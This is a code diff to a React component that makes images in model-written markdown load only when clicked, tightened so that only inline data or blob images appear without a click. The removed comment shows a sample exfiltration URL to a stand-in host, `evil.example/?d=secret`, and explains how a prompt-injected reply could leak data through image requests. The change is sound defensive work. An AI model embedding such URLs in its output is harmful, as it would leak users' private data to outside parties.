@@ -1,23 +1,24 @@
 import React, { useState } from "react";
 import { ExternalLink } from "./env";
 
-/** Images the model writes into markdown load only on click. Loading one sends a request to
- * whoever hosts it, and a prompt-injected reply could hide data in that URL
- * (`![](https://evil.example/?d=secret)`). Local and inline images load as usual. */
+/** Model-authored image URLs load only on click. Even a same-origin URL can
+ * proxy a remote image through /lean/media, so only inline data/blob images
+ * are safe to show without a network request. */
 export function SafeImage({ src, alt }: { src?: string; alt?: string }) {
   const url = String(src || "");
-  const local = url.startsWith("data:image/") || url.startsWith("blob:") || url.startsWith("/") || /^https?:\/\/(127\.0\.0\.1|localhost)(:\d+)?\//.test(url);
-  const [shown, setShown] = useState(local);
-  if (!/^(https?:|data:image\/|blob:|\/)/.test(url)) return <span>{alt || ""}</span>;
+  const inline = /^data:image\/(?:png|jpeg|gif|webp|avif);base64,/i.test(url) || url.startsWith("blob:");
+  const [approvedUrl, setApprovedUrl] = useState("");
+  if (!/^(https?:|data:image\/|blob:|\/)/i.test(url)) return <span>{alt || ""}</span>;
+  const shown = inline || approvedUrl === url;
   if (shown) return <img src={url} alt={alt || ""} loading="lazy" referrerPolicy="no-referrer" style={{ maxWidth: "100%" }} />;
   let host = "";
   try {
-    host = new URL(url).host;
+    host = url.startsWith("/") && !url.startsWith("//") ? "this app" : new URL(url, "http://localhost").host;
   } catch {
     host = "another site";
   }
   return (
-    <button type="button" className="es-btn es-btn-sm" onClick={() => setShown(true)} title={url}>
+    <button type="button" className="es-btn es-btn-sm" onClick={() => setApprovedUrl(url)} title={url}>
       Show image{alt ? ` “${alt}”` : ""} from {host}
     </button>
   );
